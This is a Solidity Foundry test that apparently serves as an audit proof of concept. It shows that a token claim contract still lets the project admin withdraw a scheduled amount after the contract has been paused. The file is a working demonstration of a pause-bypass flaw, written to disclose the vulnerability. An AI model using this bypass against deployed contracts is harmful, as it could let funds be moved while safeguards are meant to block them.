// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract PoCPauseBypass is BaseTest {
    address public pauser = makeAddr("pauser");

    function test_PoC_WithdrawalSucceedsWhenPaused()
        public
        whenProjectAddedAndClaimDeployed
    {
        // --- 1. Setup funds and schedule a valid withdrawal ---
        uint256 withdrawalAmount = 200 ether;

        // Use `deal` to give the project admin the exact amount of tokens needed for the test.
        deal(address(s_token), PROJECT_ADMIN, withdrawalAmount);

        _changePrank(PROJECT_ADMIN);
        s_token.approve(address(s_claim), withdrawalAmount);
        s_claim.deposit(withdrawalAmount);

        _changePrank(ADMIN);
        s_factory.scheduleWithdraw(
            address(s_token),
            PROJECT_ADMIN,
            withdrawalAmount
        );
        // --- 2. Pause the contract ---
        //
        _changePrank(ADMIN);
        s_factory.grantRole(s_factory.PAUSER_ROLE(), pauser);
        _changePrank(pauser);
        s_factory.pauseClaimContract(address(s_token));

        // --- 3. Execute the withdrawal ---
        // This call should revert because the contract is paused, but it will succeed,
        // proving the vulnerability. A passing test here is a proof of concept.
        _changePrank(PROJECT_ADMIN);
        s_claim.withdraw();
    }
}
